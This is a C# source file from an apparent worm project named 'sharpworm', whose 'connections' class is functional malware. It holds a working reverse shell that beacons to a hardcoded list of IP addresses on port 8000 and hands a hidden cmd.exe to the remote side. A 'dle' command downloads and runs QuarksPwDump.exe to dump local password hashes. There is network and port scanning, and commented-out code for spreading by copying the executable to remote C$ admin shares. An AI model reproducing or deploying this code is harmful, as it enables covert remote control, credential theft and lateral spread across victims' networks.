using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Text;
using System.Web;
using System.Net;

namespace sharpworm
{
    class connections
    {
        //Based off of source @ http://www.codeproject.com/Articles/20250/Reverse-Connection-Shell
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;

        download dl = new download();
        exec e1 = new exec();
        reader r1 = new reader();
        scanner scan = new scanner();
        targets t1 = new targets();
        List<targets> target = new List<targets>();
        string[] lines;
        
        string path = Directory.GetCurrentDirectory();
        string output = String.Empty;
        public void connection()
        {
            Thread t = new Thread(run_);
            //t.Start();
            
            //string user = System.Environment.UserName;
            ////StringBuilder sB = new StringBuilder();
            //bool admin = false;
            //output = e1.exec1("net", "user " + user + " >");
            ////sB = r1.getString("user.txt");
            ////string str = sB.ToString();
            //string[] lines = output.Split('\n');
            //foreach (string line in lines)
            //{
            //    if (line.ToLower().Contains("admin"))
            //    {
            //        admin = true;
            //        break;
            //    }
            //}

            //if (!(admin))
            //{
            //    //attempt at trick, or escalate other ways
            //}
            //else
            //{
            //    bool mapped = false;
            //    string host = "172.21.196.230";
            //    string remote_drive = String.Empty;

            //    output = e1.exec1("net", "use >");

            //    lines = output.Split('\n');
            //    foreach (string line in lines)
            //    {
            //        if (line.Contains("OK"))
            //        {
            //            if (line.Contains(host + @"\C$"))
            //            {
            //                mapped = true;
            //                string[] grrr = line.Split(' ');
            //                remote_drive = grrr[11];
            //                break;
            //            }
            //        }
            //    }
            //    if (!(mapped))
            //    {
            //        output = e1.exec1("net", @"use * \\" + host + @"\C$ > ");
            //        remote_drive = output.Substring(6, 2);
            //    }
            //    string fullfile = path + @"\sharpworm.exe";
            //    bool src = File.Exists(path + "\\sharpworm.exe");
            //    bool dest = File.Exists(remote_drive + "\\sharpworm.exe");
            //    if (!(dest))
            //        File.Copy(fullfile, remote_drive + "\\sharpworm.exe");
            //    dest = File.Exists(remote_drive + "\\sharpworm.exe");
            //    if (dest)
            //    {

            //        //int pid = e1.WMI_EXEC(host, "$using current credentials", null, "sharpworm.exe", @"C:\", null);
            //    }
            //}

            //get routes -- get local blocks
            output = e1.exec1("route", "PRINT >");

            if (output.Contains("IPv4 Route Table"))
            {
                int idx = output.IndexOf("IPv4");
                string temp = output.Substring(idx, (output.Length - idx-1));
                output = temp;

                lines = output.Split('\n');
                foreach (string line in lines)
                {
                    if (!(line.Contains("====")) && !(line.Contains("Active Routes")) && !(line.Contains("Network Destination")) && !(line.Contains("IPv4 Route Table")))
                    {
                        string trim = line.TrimStart(' ');
                        string[] newstr = trim.Split(' ');
                        int k = 0;
                        for (int j = 0; j < newstr.Length; j++)
                        {
                            if (!(String.IsNullOrEmpty(newstr[j])))
                            {
                                switch (k)
                                {
                                    case 0:     //dest
                                        break;
                                    case 1:     //mask
                                        break;
                                    case 2:     //gateway
                                        break;
                                    case 3:     //interface
                                        break;
                                    default:
                                        break;
                                }

                                k++;
                            }
                        }
                    }

                }

            }


            //e1.exec1("
            //for each, scan to see if dcom, rdp are available
            //assign the bool to obj of target, then add to target list
            //class C support for now... will have to thread this for class B
            //and maybe look at the arp cache as well
            for (int i = 0; i < 255; i++)
            {
                scan.Connect("127.0.0.1", 135, 3);  //debug
                scan.Connect("127.0.0.1", 3389, 3); //debug

                output = e1.exec1("net", @"share >");
            }
               
        }

        //private string[] parser(string output)
        //{
        //    bool found = false;
        //    string[] lines = output.Split('\n');
        //    foreach (string line in lines)
        //    {
        //        if (line.Contains(parses[0]))
        //        {
                    
        //        }
        //    }

        //    return ;
        //}

        private void run_()
        {
            for (; ; )
            {
                string[] IP;
                IP = new string[5] { "127.0.0.1", "172.21.196.227", "7.22.20.25", "142.68.11.12", "204.139.94.250" };
                                    //testing     //Upstairs Lab   //VI           //DECK test     //CORE Lab

                foreach (string ipaddr in IP)
                {
                    for (int i = 0; i < 4; i++)             //try to reconnect to the same server 3 times, if no response, move on to next
                    {
                        RunServer(ipaddr, 8000);            //default port is 8000.  will add logic later to change port
                        System.Threading.Thread.Sleep(5000); //Wait 5 seconds 
                    }
                }
            }
        }

        private void RunServer(string IP, int port)
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();
            if (!tcpClient.Connected)
            {
                try
                {
                    tcpClient.Connect(IP, port);       //TO DO: ADD IP[] for multiple attempts
                    networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(networkStream);
                    streamWriter = new StreamWriter(networkStream);
                }
                catch (Exception err) { return; } //if no Client don't 
                //continue 
                processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe";
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new
                DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }
            while (true)
            {
                //string user = System.Environment.UserName;
                //e1.exec1("net", "user "+user+"> user.txt");
                //e1.exec1("net", @"share > shares.txt");
                try
                {
                    string message = String.Empty;
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\n");
                    if (strInput.ToString().LastIndexOf("dle") >= 0)
                    {
                        message =dl.downloader("http://172.21.196.227/files/QuarksPwDump.exe", "QuarksPwDump.exe");
                        e1.exec1("QuarksPwDump.exe", "--dump-hash-local --output hash.txt");
                        
                    }
                    if (strInput.ToString().LastIndexOf(
                        "terminate") >= 0) StopServer();
                    if (strInput.ToString().LastIndexOf(
                        "exit") >= 0) throw new ArgumentException();
                    processCmd.StandardInput.WriteLine(strInput);
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception err)
                {
                    Cleanup();
                    break;
                }
            }
        }

        private void Cleanup()
        {
            try { processCmd.Kill(); }
            catch (Exception err) { };
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }

        private void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private void CmdOutputDataHandler(object sendingProcess,
            DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        } 
    }
}
